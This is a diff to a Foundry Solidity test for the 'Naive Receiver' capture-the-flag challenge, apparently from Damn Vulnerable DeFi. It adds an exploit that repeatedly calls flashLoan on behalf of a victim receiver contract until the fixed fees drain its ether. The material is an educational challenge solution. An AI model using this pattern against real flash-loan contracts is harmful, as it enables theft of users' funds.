@@ -33,9 +33,7 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
-        flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
-        );
+        flashLoanReceiver = new FlashLoanReceiver(payable(naiveReceiverLenderPool));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
@@ -44,10 +42,17 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitNaiveReceiver() public {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        uint256 number = address(flashLoanReceiver).balance / 1 ether;
+        for (uint256 i = 0; i < number; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1 ether);
+        }
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
